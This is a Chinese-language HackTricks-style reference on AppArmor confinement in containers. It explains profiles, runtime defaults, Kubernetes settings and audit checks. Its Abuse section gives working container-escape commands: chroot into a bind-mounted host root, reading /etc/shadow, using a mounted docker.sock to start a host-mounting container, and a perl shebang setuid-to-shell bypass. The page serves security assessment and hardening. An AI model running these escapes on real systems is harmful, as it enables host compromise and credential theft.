# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

AppArmor 是一种**Mandatory Access Control**系统，通过针对每个程序的 profile 实施限制。与高度依赖用户和组所有权的传统 DAC 检查不同，AppArmor 允许 kernel 强制执行附加到进程本身的策略。在容器环境中，这一点很重要，因为某个 workload 可能拥有足够的传统权限来尝试执行某项操作，但仍会因为其 AppArmor profile 不允许访问相关路径、执行 mount、进行网络行为或使用某项 capability 而被拒绝。

最重要的概念是，AppArmor 是**基于路径的**。它通过路径规则判断文件系统访问，而不是像 SELinux 那样通过 labels 进行判断。这使它易于使用且功能强大，但也意味着 bind mounts 和其他路径布局需要仔细关注。如果相同的 host 内容可以通过不同路径访问，策略的实际效果可能与 operator 最初的预期不同。

## 在容器隔离中的作用

容器安全审查通常会在检查 capabilities 和 seccomp 后停止，但 AppArmor 在这些检查之后仍然很重要。假设某个容器拥有超出应有范围的权限，或者某个 workload 因 operational 原因需要额外的一项 capability。AppArmor 仍然可以限制文件访问、mount 行为、网络连接和执行模式，从而阻止明显的 abuse path。这也是为什么为了“让 application 正常运行”而禁用 AppArmor，可能会悄然将一个仅仅存在风险的配置转变为可被 actively exploitable 的配置。

## 实验

要检查 host 上的 AppArmor 是否处于 active 状态，请使用：
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
要查看当前容器进程以何种身份运行：
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
这个差异很有说明性。在正常情况下，进程应显示一个与 runtime 选择的 profile 相关联的 AppArmor context。而在 unconfined 情况下，这一额外的限制层会消失。

你也可以检查 Docker 认为自己应用了哪些设置：
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

当 host 支持 AppArmor 时，Docker 可以应用默认或自定义的 AppArmor profile。Podman 也可以在基于 AppArmor 的系统上与 AppArmor 集成，不过在以 SELinux 为首选的发行版中，另一个 MAC system 往往占据主要地位。Kubernetes 可以在实际支持 AppArmor 的 node 上，以 workload 级别暴露 AppArmor policy。LXC 及相关的 Ubuntu-family system-container 环境也广泛使用 AppArmor。

实际要点是，AppArmor 并不是一个 “Docker feature”。它是 host-kernel feature，多个 runtime 都可以选择应用它。如果 host 不支持 AppArmor，或者 runtime 被设置为以 unconfined 模式运行，那么所谓的 protection 实际上并不存在。

对于 Kubernetes，现代 API 是 `securityContext.appArmorProfile`。从 Kubernetes `v1.30` 开始，旧的 beta AppArmor annotations 已被弃用。在受支持的 host 上，`RuntimeDefault` 是默认 profile，而 `Localhost` 指向一个必须已经加载到 node 上的 profile。这一点在 review 期间很重要，因为某个 manifest 看起来可能支持 AppArmor，但实际上仍完全依赖 node-side support 和预加载的 profile。

一个微妙但有用的 operational detail 是，显式设置 `appArmorProfile.type: RuntimeDefault` 比简单地省略该字段更加严格。如果显式设置了该字段，而 node 不支持 AppArmor，admission 应该失败。如果省略该字段，workload 仍可能在没有 AppArmor 的 node 上运行，只是不会获得这一额外的 confinement layer。从 attacker 的角度来看，这是同时检查 manifest 和实际 node state 的一个重要理由。

在支持 Docker 的 AppArmor host 上，最知名的默认 profile 是 `docker-default`。该 profile 根据 Moby 的 AppArmor template 生成，这很重要，因为它解释了为什么某些基于 capability 的 PoC 在默认 container 中仍然会失败。概括来说，`docker-default` 允许普通 networking，拒绝对 `/proc` 大部分内容的写入，拒绝访问 `/sys` 中的敏感部分，阻止 mount operations，并限制 ptrace，使其无法作为通用的 host-probing primitive。理解这一 baseline 有助于区分“container 拥有 `CAP_SYS_ADMIN`”和“container 实际上可以利用该 capability 访问我关心的 kernel interfaces”。

## Profile Management

AppArmor profiles 通常存储在 `/etc/apparmor.d/` 下。常见的命名约定是将 executable path 中的斜杠替换为点。例如，`/usr/bin/man` 的 profile 通常存储为 `/etc/apparmor.d/usr.bin.man`。这一细节在 defense 和 assessment 期间都很重要，因为一旦知道 active profile 的名称，通常就能在 host 上快速找到对应的文件。

有用的 host-side management commands 包括：
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
这些命令之所以在 container-security 参考资料中很重要，是因为它们说明了 profile 实际上是如何构建、加载、切换到 complain mode，以及在应用发生更改后进行修改的。如果 operator 习惯于在故障排查期间将 profile 切换到 complain mode，却忘记恢复 enforcement，那么 container 在文档中看起来可能受到保护，但实际上运行得宽松得多。

### 构建和更新 Profiles

`aa-genprof` 可以观察应用行为，并帮助以交互方式生成 profile：
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` 可以生成一个模板 profile，之后可使用 `apparmor_parser` 加载：
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
当二进制文件发生变化且需要更新 policy 时，`aa-logprof` 可以重放日志中发现的拒绝记录，并协助 operator 决定是允许还是拒绝它们：
```bash
sudo aa-logprof
```
### Logs

AppArmor 拒绝日志通常可以通过 `auditd`、syslog 或 `aa-notify` 等工具查看：
```bash
sudo aa-notify -s 1 -v
```
这在 operational 和 offensive 场景中都很有用。Defender 使用它来优化 profiles。Attacker 使用它来了解具体是哪个 path 或 operation 被拒绝，以及 AppArmor 是否是阻止 exploit chain 的 control。

### 识别确切的 Profile 文件

当 runtime 为某个 container 显示特定的 AppArmor profile name 时，通常可以将该名称映射回磁盘上的 profile file：
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
这在 host-side review 期间尤其有用，因为它弥合了“container 声称自己运行在 `lowpriv` profile 下”和“实际规则位于这个可被 audit 或 reload 的特定文件中”之间的差距。

### 需要 Audit 的高信号规则

当你可以读取一个 profile 时，不要只停留在简单的 `deny` 行上。几种规则类型会实质性地改变 AppArmor 防御 container escape attempt 的效果：

- `ux` / `Ux`：以 unconfined 状态执行目标 binary。如果某个可访问的 helper、shell 或 interpreter 被允许使用 `ux`，这通常是首先要 test 的对象。
- `px` / `Px` 和 `cx` / `Cx`：在 exec 时执行 profile transition。这些并不一定是坏事，但值得 audit，因为 transition 可能会进入一个权限范围远大于当前 profile 的 profile。
- `change_profile`：允许 task 切换到另一个已加载的 profile，可以立即切换，也可以在下次 exec 时切换。如果目标 profile 更弱，这可能成为从 restrictive domain 中进行 escape 的预定出口。
- `flags=(complain)`、`flags=(unconfined)` 或更新的 `flags=(prompt)`：这些选项会影响你对该 profile 的信任程度。`complain` 会记录 denials 而不是强制执行，`unconfined` 会移除边界，而 `prompt` 依赖 userspace decision path，而不是完全由 kernel 强制 deny。
- `userns` 或 `userns create,`：更新的 AppArmor policy 可以 mediate user namespace 的创建。如果 container profile 明确允许该操作，那么即使 platform 将 AppArmor 作为 hardening strategy 的一部分，nested user namespaces 仍然可用。

有用的 host-side grep：
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
这种审计通常比盯着数百条普通文件规则更有用。如果一次 breakout 依赖于执行 helper、进入新的 namespace，或逃逸到限制更少的 profile，那么答案往往隐藏在这些面向 transition 的规则中，而不是明显的 `deny /etc/shadow r` 这类行里。

## Misconfigurations

最明显的错误是 `apparmor=unconfined`。管理员经常在调试应用时设置它，因为该应用此前因 profile 正确阻止了某些危险或意外操作而失败。如果这个标志留在 production 中，整个 MAC layer 实际上就被移除了。

另一个隐蔽问题是认为 bind mounts 无害，因为文件权限看起来正常。由于 AppArmor 基于路径工作，将 host 路径暴露在其他 mount 位置下可能会与路径规则产生不良交互。第三个错误是忘记：配置文件中的 profile 名称本身意义不大，前提是 host kernel 实际上正在强制执行 AppArmor。

## Abuse

当 AppArmor 不再生效时，之前受到限制的操作可能会突然成功：通过 bind mounts 读取敏感路径，访问原本应更难使用的 procfs 或 sysfs 部分，在 capabilities/seccomp 也允许的情况下执行与 mount 相关的操作，或使用 profile 通常会拒绝的路径。AppArmor 往往是解释以下情况的机制：一次基于 capability 的 breakout 尝试从理论上看“应该成功”，但在实践中仍然失败。移除 AppArmor 后，同样的尝试可能就会开始成功。

如果你怀疑 AppArmor 是阻止 path-traversal、bind-mount 或基于 mount 的 abuse chain 的主要因素，第一步通常是比较有 profile 和没有 profile 时哪些内容变得可访问。例如，如果某个 host 路径被挂载到 container 内，先检查你是否可以遍历并读取它：
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
如果容器还具有 `CAP_SYS_ADMIN` 等危险 capability，最实用的测试之一是确认 AppArmor 是否是阻止 mount 操作或访问敏感内核文件系统的控制机制：
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
在主机路径已通过 bind mount 可用的环境中，失去 AppArmor 保护还可能将只读信息泄露问题转变为直接访问主机文件：
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
这些命令的重点并不是 AppArmor 单独创建了 breakout，而是移除 AppArmor 后，许多基于 filesystem 和 mount 的 abuse 路径会立即变得可测试。

### 完整示例：AppArmor Disabled + Host Root Mounted

如果 container 已经将 host root bind-mounted 到 `/host`，移除 AppArmor 可能会将原本受阻的 filesystem abuse 路径转变为完整的 host escape：
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
一旦 shell 通过主机文件系统执行，工作负载实际上就已经逃逸出容器边界：
```bash
id
hostname
cat /etc/shadow | head
```
### 完整示例：AppArmor 已禁用 + Runtime Socket

如果真正的屏障是围绕运行时状态的 AppArmor，那么挂载一个 socket 就足以完成逃逸：
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
具体路径取决于 mount point，但最终结果相同：AppArmor 不再阻止对 runtime API 的访问，而 runtime API 可以启动一个能够 compromise host 的 container。

### Full Example: Path-Based Bind-Mount Bypass

由于 AppArmor 基于路径进行保护，因此保护 `/proc/**` 并不会自动保护通过其他路径可访问的相同 host procfs 内容：
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
影响取决于具体挂载的内容，以及备用路径是否同时绕过了其他控制措施，但这一模式是最清楚地说明为什么必须结合挂载布局评估 AppArmor，而不能孤立评估的原因之一。

### 完整示例：Shebang 绕过

AppArmor policy 有时会针对某个 interpreter path，但未能充分考虑通过 shebang 处理执行 script 的情况。一个历史示例涉及使用一个首行指向受限 interpreter 的 script：
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
这类示例很重要，它提醒我们：profile intent 与实际执行语义可能存在差异。在容器环境中审查 AppArmor 时，应特别关注 interpreter chains 和 alternate execution paths。

## 检查

这些检查的目标是快速回答三个问题：主机上是否启用了 AppArmor、当前进程是否受到限制，以及 runtime 是否确实为此容器应用了 profile。
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
这里有哪些值得关注的地方：

- 如果 `/proc/self/attr/current` 显示 `unconfined`，则该 workload 没有受益于 AppArmor confinement。
- 如果 `aa-status` 显示 AppArmor 已禁用或未加载，则 runtime config 中的任何 profile 名称大多只是表面设置。
- 如果 `docker inspect` 显示 `unconfined` 或意外的 custom profile，这通常就是 filesystem 或 mount-based abuse path 能够生效的原因。
- 如果 `/sys/kernel/security/apparmor/profiles` 不包含你预期的 profile，仅靠 runtime 或 orchestrator configuration 并不足够。
- 如果一个 supposedly hardened profile 包含 `ux`、宽泛的 `change_profile`、`userns` 或 `flags=(complain)` 类型的规则，那么实际 security boundary 可能比 profile 名称所暗示的弱得多。

如果一个 container 因 operational reasons 已经拥有 elevated privileges，保持 AppArmor 启用通常是受控例外与更广泛 security failure 之间的关键区别。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 在支持 AppArmor 的 host 上默认启用 | 除非被覆盖，否则使用 `docker-default` AppArmor profile | `--security-opt apparmor=unconfined`、`--security-opt apparmor=<profile>`、`--privileged` |
| Podman | 取决于 host | AppArmor 可通过 `--security-opt` 使用，但具体默认行为取决于 host/runtime，并不像 Docker 文档中的 `docker-default` profile 那样通用 | `--security-opt apparmor=unconfined`、`--security-opt apparmor=<profile>`、`--privileged` |
| Kubernetes | 有条件的默认设置 | 如果未指定 `appArmorProfile.type`，默认值为 `RuntimeDefault`，但只有在 node 启用 AppArmor 时才会应用 | `securityContext.appArmorProfile.type: Unconfined`、使用弱 profile 的 `securityContext.appArmorProfile.type: Localhost`、不支持 AppArmor 的 node |
| containerd / CRI-O under Kubernetes | 遵循 node/runtime 支持情况 | 常见的 Kubernetes 支持的 runtime 支持 AppArmor，但实际 enforcement 仍取决于 node 支持情况和 workload 设置 | 与 Kubernetes 行相同；直接的 runtime configuration 也可能完全跳过 AppArmor |

对于 AppArmor，最重要的变量通常是 **host**，而不只是 runtime。manifest 中的 profile 设置无法在未启用 AppArmor 的 node 上创建 confinement。

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
